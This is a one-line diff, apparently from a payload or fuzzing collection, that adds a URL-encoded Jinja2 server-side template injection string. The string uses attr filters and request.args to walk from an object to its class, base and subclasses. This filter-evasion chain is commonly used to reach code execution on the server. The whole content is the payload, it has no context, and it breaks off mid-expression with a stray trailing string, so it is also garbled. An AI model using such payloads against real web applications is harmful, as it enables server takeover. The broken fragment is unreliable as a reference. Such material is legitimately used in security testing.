@@ -1,0 +1,1 @@
+LMAO%7B%7B%20()%7Cattr(request.args.class)%7Cattr(request.args.base)%7Cattr(request.args.subclasses)()%7Cattr(request.args-hJDscB4UHuk
